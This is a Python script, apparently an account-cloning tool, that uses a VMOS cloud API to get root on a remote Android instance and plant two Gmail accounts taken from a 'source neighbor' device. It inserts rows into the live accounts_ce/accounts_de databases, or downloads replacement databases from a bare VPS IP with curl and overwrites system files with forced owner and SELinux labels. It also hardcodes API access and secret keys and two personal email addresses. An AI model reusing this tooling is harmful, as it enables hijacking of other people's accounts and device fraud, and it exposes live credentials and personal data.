#!/usr/bin/env python3
"""
Clone Restore v5 — LIVE SQL INJECTION (No File Replace, No Restart)
===================================================================
Root cause from v1-v4: Replacing DB files + any restart = device death.

v5 approach:
  1. Use sqlite3 to INSERT directly into the LIVE accounts DBs
  2. No file replacement. No cp. No mv.
  3. No system_server kill. No instance_restart. No zygote restart.
  4. Minimal data: account names only (no tokens, no extras initially)
  5. Broadcast to notify AccountManagerService

If sqlite3 is missing on the device, push a static binary.

Source: 10.12.21.175 (SM-S9110)
  - petersfaustina699@gmail.com
  - faustinapeters11@gmail.com
"""
import asyncio
import os
import sys
import time

os.environ['VMOS_ALLOW_RESTART'] = '1'
sys.path.insert(0, ".")
from vmos_titan.core.vmos_cloud_api import VMOSCloudClient

TARGET = "ACP2507303B6HNRI"
VPS = "37.60.234.139:9999"
TMP = "/data/local/tmp/clone"

# Account data from source neighbor 10.12.21.175
ACCOUNTS = [
    {"name": "petersfaustina699@gmail.com", "type": "com.google"},
    {"name": "faustinapeters11@gmail.com", "type": "com.google"},
]

CE_DB = "/data/system_ce/0/accounts_ce.db"
DE_DB = "/data/system_de/0/accounts_de.db"


async def cmd(client, pad, command, timeout=30, label="", retries=3):
    """Execute sync_cmd with retry and rate limiting."""
    for attempt in range(retries):
        try:
            r = await client.sync_cmd(pad, command, timeout_sec=timeout)
            code = r.get("code", 0)
            if code == 200:
                data = r.get("data", [])
                if data and isinstance(data, list) and data[0]:
                    out = data[0].get("errorMsg") or ""
                    return out.strip()
                return ""
            elif code == 110012:
                if attempt < retries - 1:
                    print(f"    [{label}] timeout, retry {attempt+1}...")
                    await asyncio.sleep(3)
                    continue
                return None
            elif code == 110031:
                if attempt < retries - 1:
                    print(f"    [{label}] not ready, retry {attempt+1}...")
                    await asyncio.sleep(8)
                    continue
                return None
            else:
                print(f"    [{label}] code={code} msg={r.get('msg','')}")
                return None
        except Exception as e:
            print(f"    [{label}] error: {e}")
            if attempt < retries - 1:
                await asyncio.sleep(3)
    return None


async def main():
    t0 = time.time()
    client = VMOSCloudClient(
        ak="BPWNWxfXMQsjsREyzIOXmCtndRZO8iVi",
        sk="Q2SgcSwEfuwoedY0cijp6Mce",
        base_url="https://api.vmoscloud.com"
    )

    print("=" * 70)
    print("  CLONE RESTORE v5 — LIVE SQL INJECTION")
    print(f"  Target: {TARGET}")
    print("  Strategy: Direct INSERT into live DBs, NO restart")
    print("=" * 70)

    # ══════ PHASE 1: PRE-FLIGHT ══════
    print("\n╔══ PHASE 1: PRE-FLIGHT ══╗")
    out = await cmd(client, TARGET, "id", label="preflight")
    if out is None:
        print("  FATAL: Device unreachable")
        return
    print(f"  Root: {out[:80]}")
    if "root" not in out:
        print("  FATAL: Not root")
        return
    await asyncio.sleep(3)

    # Check Android version and initial state
    out = await cmd(client, TARGET, "getprop ro.build.version.release", label="android")
    print(f"  Android: {out}")
    await asyncio.sleep(3)

    out = await cmd(client, TARGET, "dumpsys account 2>/dev/null | head -5", label="state")
    print(f"  Account state: {out[:200] if out else 'N/A'}")
    await asyncio.sleep(3)

    # ══════ PHASE 2: CHECK SQLITE3 AVAILABILITY ══════
    print("\n╔══ PHASE 2: FIND/INSTALL SQLITE3 ══╗")
    
    # Check common paths
    out = await cmd(client, TARGET,
        "which sqlite3 2>/dev/null || "
        "ls /system/bin/sqlite3 2>/dev/null || "
        "ls /system/xbin/sqlite3 2>/dev/null || "
        "ls /data/local/tmp/sqlite3 2>/dev/null || "
        "echo NOT_FOUND",
        label="find_sqlite3")
    print(f"  sqlite3 search: {out}")
    await asyncio.sleep(3)

    sqlite3_bin = None
    if out and "NOT_FOUND" not in out:
        sqlite3_bin = out.split("\n")[0].strip()
        print(f"  Found: {sqlite3_bin}")
    else:
        # Try to use built-in sqlite3 via cmd
        print("  sqlite3 not found, testing alternatives...")
        
        # Method 1: Try Android's built-in 'content' command for ContentProvider access
        # Method 2: Try using app_process with dalvikvm
        # Method 3: Download static sqlite3 binary
        
        print("  Downloading static sqlite3...")
        # Download from VPS - we'll need to host one there
        # First check if we can use python3 on device as sqlite alternative
        out = await cmd(client, TARGET, "which python3 || which python", label="python")
        print(f"  Python: {out}")
        await asyncio.sleep(3)
        
        if not out or "not found" in out.lower():
            # Download sqlite3 from Android SDK or build tools
            # Use the one bundled in /system if there's one in the ROM
            out = await cmd(client, TARGET, 
                "find /system -name 'sqlite3' -type f 2>/dev/null | head -1",
                label="find_deep")
            print(f"  Deep search: {out}")
            await asyncio.sleep(3)
            
            if out and "/" in out:
                sqlite3_bin = out.strip()
                print(f"  Found: {sqlite3_bin}")
            else:
                # Check if we can script SQL via Android's built-in tools
                # The 'content' command can access ContentProviders
                # Or use 'sm' (StorageManager) - no
                # Last resort: push sqlite3 binary
                print("  No sqlite3 found. Trying to create DB commands via shell...")
                # We'll use a different approach: push modified DBs but DON'T restart
                sqlite3_bin = None
    
    await asyncio.sleep(3)

    # ══════ PHASE 3: INSPECT LIVE DBs ══════  
    print("\n╔══ PHASE 3: INSPECT LIVE DBs ══╗")
    
    # Check current DB state
    out = await cmd(client, TARGET, f"ls -la {CE_DB} {DE_DB}", label="db_files")
    print(f"  DB files: {out}")
    await asyncio.sleep(3)

    # Check if there are WAL/SHM files (indicating active writers)
    out = await cmd(client, TARGET, 
        f"ls -la {CE_DB}-wal {CE_DB}-shm {DE_DB}-wal {DE_DB}-shm 2>&1",
        label="wal_check")
    print(f"  WAL/SHM: {out}")
    await asyncio.sleep(3)

    if sqlite3_bin:
        # ══════ PHASE 4A: DIRECT SQL INJECTION ══════
        print(f"\n╔══ PHASE 4A: DIRECT SQL INJECTION (using {sqlite3_bin}) ══╗")
        
        # Step 1: Check current account count in CE DB
        out = await cmd(client, TARGET, 
            f'{sqlite3_bin} {CE_DB} "SELECT COUNT(*) FROM accounts;"',
            label="ce_count")
        print(f"  CE accounts before: {out}")
        await asyncio.sleep(3)

        out = await cmd(client, TARGET, 
            f'{sqlite3_bin} {DE_DB} "SELECT COUNT(*) FROM accounts;"',
            label="de_count")
        print(f"  DE accounts before: {out}")
        await asyncio.sleep(3)

        # Step 2: Inject into DE database (accounts + visibility + meta)
        print("\n  Injecting into DE database...")
        
        de_sql = ".timeout 5000\nBEGIN TRANSACTION;\n"
        for i, acct in enumerate(ACCOUNTS, 1):
            de_sql += (f"INSERT OR IGNORE INTO accounts (_id, name, type, previous_name, "
                      f"last_password_entry_time_millis_epoch) "
                      f"VALUES ({i}, '{acct['name']}', '{acct['type']}', NULL, 0);\n")
        
        # Add visibility entries (all packages can see these accounts)
        for i in range(1, len(ACCOUNTS) + 1):
            de_sql += f"INSERT OR IGNORE INTO visibility (accounts_id, package, value) VALUES ({i}, 'android', 1);\n"
        
        # Update meta table with correct UID for com.google authenticator
        de_sql += "INSERT OR REPLACE INTO meta (key, value) VALUES ('auth_uid_for_type:com.google', '10036');\n"
        
        # Update sqlite_sequence
        de_sql += f"INSERT OR REPLACE INTO sqlite_sequence (name, seq) VALUES ('accounts', {len(ACCOUNTS)});\n"
        
        de_sql += "COMMIT;\n"
        
        # Write SQL to temp file on device then execute
        # Escape for shell
        escaped_sql = de_sql.replace("'", "'\\''")
        out = await cmd(client, TARGET,
            f"echo '{escaped_sql}' > {TMP}/de_inject.sql && "
            f"{sqlite3_bin} {DE_DB} < {TMP}/de_inject.sql 2>&1 && echo DE_OK",
            label="de_inject")
        if out is None:
            # Try direct approach
            out = await cmd(client, TARGET,
                f"mkdir -p {TMP}",
                label="mkdir")
            await asyncio.sleep(2)
            
            # Write SQL file
            for line in de_sql.strip().split("\n"):
                line_esc = line.replace("'", "'\\''")
                await cmd(client, TARGET, f"echo '{line_esc}' >> {TMP}/de_inject.sql", label="write_sql", retries=1)
                await asyncio.sleep(1)
            
            out = await cmd(client, TARGET,
                f"{sqlite3_bin} {DE_DB} < {TMP}/de_inject.sql 2>&1; echo EXIT_$?",
                label="de_inject2")
        print(f"  DE inject: {out}")
        await asyncio.sleep(3)

        # Verify DE
        out = await cmd(client, TARGET,
            f'{sqlite3_bin} {DE_DB} "SELECT _id, name, type FROM accounts;"',
            label="de_verify")
        print(f"  DE accounts: {out}")
        await asyncio.sleep(3)

        # Step 3: Inject into CE database (accounts only - no tokens/extras)
        print("\n  Injecting into CE database...")
        
        ce_sql = ".timeout 5000\nBEGIN TRANSACTION;\n"
        for i, acct in enumerate(ACCOUNTS, 1):
            ce_sql += (f"INSERT OR IGNORE INTO accounts (_id, name, type) "
                      f"VALUES ({i}, '{acct['name']}', '{acct['type']}');\n")
        
        # Update sqlite_sequence
        ce_sql += f"INSERT OR REPLACE INTO sqlite_sequence (name, seq) VALUES ('accounts', {len(ACCOUNTS)});\n"
        
        ce_sql += "COMMIT;\n"
        
        escaped_sql = ce_sql.replace("'", "'\\''")
        out = await cmd(client, TARGET,
            f"echo '{escaped_sql}' > {TMP}/ce_inject.sql && "
            f"{sqlite3_bin} {CE_DB} < {TMP}/ce_inject.sql 2>&1 && echo CE_OK",
            label="ce_inject")
        if out is None:
            for line in ce_sql.strip().split("\n"):
                line_esc = line.replace("'", "'\\''")
                await cmd(client, TARGET, f"echo '{line_esc}' >> {TMP}/ce_inject.sql", label="write_sql", retries=1)
                await asyncio.sleep(1)
            out = await cmd(client, TARGET,
                f"{sqlite3_bin} {CE_DB} < {TMP}/ce_inject.sql 2>&1; echo EXIT_$?",
                label="ce_inject2")
        print(f"  CE inject: {out}")
        await asyncio.sleep(3)

        # Verify CE
        out = await cmd(client, TARGET,
            f'{sqlite3_bin} {CE_DB} "SELECT _id, name, type FROM accounts;"',
            label="ce_verify")
        print(f"  CE accounts: {out}")
        await asyncio.sleep(3)

    else:
        # ══════ PHASE 4B: FILE-BASED INJECTION (NO RESTART) ══════
        print("\n╔══ PHASE 4B: FILE-BASED INJECTION (NO RESTART) ══╗")
        print("  sqlite3 not available — using hybrid DB replacement WITHOUT restart")
        print("  CRITICAL: Will NOT restart system_server")
        
        # Download hybrid DBs
        print("\n  Downloading hybrid DBs...")
        dl_cmd = (f"mkdir -p {TMP} && "
                  f"nohup sh -c '"
                  f"curl -sf --connect-timeout 10 --max-time 120 http://{VPS}/hybrid_ce.db -o {TMP}/hybrid_ce.db && "
                  f"curl -sf --connect-timeout 10 --max-time 120 http://{VPS}/hybrid_de.db -o {TMP}/hybrid_de.db && "
                  f"echo DONE > {TMP}/dl_status' >/dev/null 2>&1 &"
                  f" echo LAUNCHED")
        out = await cmd(client, TARGET, dl_cmd, label="bg_dl")
        print(f"  Download: {out}")
        
        for poll in range(20):
            await asyncio.sleep(5)
            out = await cmd(client, TARGET, f"cat {TMP}/dl_status 2>/dev/null", label="poll")
            if out and "DONE" in out:
                print(f"  Downloads complete at poll {poll+1}")
                break
            print(f"  Poll {poll+1}: waiting...")
        
        await asyncio.sleep(3)
        
        # Verify MD5s
        out = await cmd(client, TARGET, f"md5sum {TMP}/hybrid_ce.db {TMP}/hybrid_de.db", label="md5")
        print(f"  MD5: {out}")
        await asyncio.sleep(3)

        # Freeze GMS before replacement
        print("\n  Freezing GMS...")
        out = await cmd(client, TARGET,
            "am force-stop com.google.android.gms; "
            "am force-stop com.google.android.gsf; "
            "killall -9 com.google.android.gms com.google.android.gsf 2>/dev/null; "
            "echo FROZEN",
            label="freeze")
        print(f"  {out}")
        await asyncio.sleep(3)

        # Clean WAL/SHM
        out = await cmd(client, TARGET,
            f"rm -f {CE_DB}-wal {CE_DB}-shm {CE_DB}-journal "
            f"{DE_DB}-wal {DE_DB}-shm {DE_DB}-journal && echo CLEANED",
            label="clean_wal")
        print(f"  WAL cleanup: {out}")
        await asyncio.sleep(2)

        # Install hybrid DBs with correct perms
        for src, dest in [("hybrid_ce.db", CE_DB), ("hybrid_de.db", DE_DB)]:
            print(f"\n  Installing {src} → {dest}")
            out = await cmd(client, TARGET,
                f"cp {TMP}/{src} {dest} && "
                f"chown 1000:1000 {dest} && "
                f"chmod 660 {dest} && "
                f"chcon u:object_r:accounts_data_file:s0 {dest} && "
                f"echo OK",
                label=f"install_{src}")
            print(f"    {out}")
            await asyncio.sleep(2)
        
        # Verify file properties
        out = await cmd(client, TARGET, f"ls -laZ {CE_DB} {DE_DB}", label="ls_verify")
        print(f"  Files: {out}")
        await asyncio.sleep(3)

        print("\n  *** NOT restarting system_server ***")
        print("  Will try broadcast-based notification instead")

    # ══════ PHASE 5: NOTIFY ACCOUNT CHANGE (No Restart) ══════
    print("\n╔══ PHASE 5: NOTIFY ACCOUNT CHANGE ══╗")
    
    # Method 1: Broadcast
    print("  Sending LOGIN_ACCOUNTS_CHANGED broadcast...")
    out = await cmd(client, TARGET,
        "am broadcast -a android.accounts.LOGIN_ACCOUNTS_CHANGED 2>&1",
        label="broadcast1")
    print(f"  Broadcast: {out}")
    await asyncio.sleep(5)

    # Method 2: ACCOUNTS_CHANGED broadcast
    out = await cmd(client, TARGET,
        "am broadcast -a android.accounts.action.ACCOUNT_REMOVED 2>&1; "
        "am broadcast -a android.accounts.LOGIN_ACCOUNTS_CHANGED_ON_DEVICE 2>&1",
        label="broadcast2")
    print(f"  Broadcast2: {out}")
    await asyncio.sleep(5)

    # Method 3: Content change notify
    out = await cmd(client, TARGET,
        "content call --uri content://settings --method GET_system --arg account_login_accounts_changed 2>&1; "
        "settings put secure account_login_accounts_changed $(date +%s) 2>&1",
        label="content_notify")
    print(f"  Content notify: {out}")
    await asyncio.sleep(5)

    # ══════ PHASE 6: FIRST VERIFICATION (Pre-Restart) ══════
    print("\n" + "=" * 70)
    print("  PHASE 6: VERIFICATION (No Restart)")
    print("=" * 70)

    out = await cmd(client, TARGET, "dumpsys account 2>/dev/null | head -40", timeout=30, label="dumpsys_pre")
    if out:
        for line in out.split("\n")[:35]:
            print(f"    {line}")
    else:
        print("    [dumpsys failed]")
    await asyncio.sleep(3)

    # Check if accounts appeared
    out = await cmd(client, TARGET,
        "dumpsys account 2>/dev/null | grep -c '@gmail.com'",
        label="count_pre")
    gmail_refs = int(out.strip()) if out and out.strip().isdigit() else 0
    print(f"\n  Gmail references (pre-restart): {gmail_refs}")
    await asyncio.sleep(3)

    # ══════ PHASE 7: GENTLE RESTART (If Accounts = 0) ══════
    if gmail_refs == 0:
        print("\n╔══ PHASE 7: GENTLE RESTART ══╗")
        print("  No accounts visible yet. Trying minimal restart approaches...")
        
        # Method A: Kill only com.android.server.accounts.AccountManagerService
        # It runs INSIDE system_server, so we can't kill it separately.
        # Instead, try to restart just GMS
        print("\n  [7a] Restarting GMS only (not system_server)...")
        out = await cmd(client, TARGET,
            "am force-stop com.google.android.gms && "
            "sleep 2 && "
            "am startservice -n com.google.android.gms/.chimera.PersistentApiService 2>&1",
            label="restart_gms")
        print(f"  GMS restart: {out}")
        await asyncio.sleep(10)

        out = await cmd(client, TARGET, "dumpsys account 2>/dev/null | head -10", label="check_7a")
        print(f"  After GMS restart: {out}")
        await asyncio.sleep(3)

        out = await cmd(client, TARGET, "dumpsys account 2>/dev/null | grep -c '@gmail.com'", label="count_7a")
        gmail_refs = int(out.strip()) if out and out.strip().isdigit() else 0
        print(f"  Gmail references: {gmail_refs}")
        await asyncio.sleep(3)
        
        if gmail_refs == 0:
            # Method B: Try a soft system_server nudge
            print("\n  [7b] Sending SIGUSR1 to system_server (soft nudge)...")
            out = await cmd(client, TARGET,
                "kill -USR1 $(pidof system_server) 2>&1; echo SENT",
                label="sigusr1")
            print(f"  SIGUSR1: {out}")
            await asyncio.sleep(10)

            out = await cmd(client, TARGET, "dumpsys account 2>/dev/null | head -10", label="check_7b")
            print(f"  After SIGUSR1: {out}")
            await asyncio.sleep(3)

            out = await cmd(client, TARGET, "dumpsys account 2>/dev/null | grep -c '@gmail.com'", label="count_7b")
            gmail_refs = int(out.strip()) if out and out.strip().isdigit() else 0
            print(f"  Gmail references: {gmail_refs}")
            await asyncio.sleep(3)

        if gmail_refs == 0:
            # Method C: RISKY - instance_restart (may kill device)
            print("\n  [7c] WARNING: Last resort — instance_restart")
            print("  This has killed 3 previous devices.")
            print("  Will wait longer for boot completion...")
            
            # Try using the VMOS API restart
            try:
                r = await client.instance_restart(TARGET)
                code = r.get("code", 0)
                print(f"  Restart response: code={code}")
            except Exception as e:
                print(f"  Restart error: {e}")
            
            # Give it a LONG time to boot
            print("  Waiting 120s for boot...")
            await asyncio.sleep(30)
            
            for boot_check in range(12):
                out = await cmd(client, TARGET, "echo ALIVE", label="boot_alive", retries=1)
                if out and "ALIVE" in out:
                    print(f"  Device ALIVE after {(boot_check+1)*10 + 30}s")
                    break
                await asyncio.sleep(10)
                print(f"  [{(boot_check+1)*10 + 30}s] waiting...")
            
            await asyncio.sleep(5)
            
            # Final check
            out = await cmd(client, TARGET, "dumpsys account 2>/dev/null | head -40", label="final_dump")
            if out:
                for line in out.split("\n")[:35]:
                    print(f"    {line}")
            else:
                print("    DEVICE MAY BE DEAD")
    else:
        print(f"\n  *** ACCOUNTS DETECTED WITHOUT RESTART ({gmail_refs} refs) ***")

    # ══════ PHASE 8: FINAL STATUS ══════
    print("\n╔══ PHASE 8: FINAL STATUS ══╗")
    out = await cmd(client, TARGET, "dumpsys account 2>/dev/null | grep -c '@gmail.com'", label="final_count")
    print(f"  Gmail references: {out}")
    
    out = await cmd(client, TARGET, "pidof system_server && uptime", label="health")
    print(f"  System health: {out}")
    
    out = await cmd(client, TARGET, f"ls -la {CE_DB} {DE_DB}", label="final_files")
    print(f"  DB files: {out}")

    elapsed = time.time() - t0
    print(f"\n{'=' * 70}")
    print(f"  CLONE RESTORE v5 COMPLETE — {elapsed:.0f}s")
    print(f"  Target: {TARGET}")
    print(f"{'=' * 70}")


if __name__ == "__main__":
    asyncio.run(main())
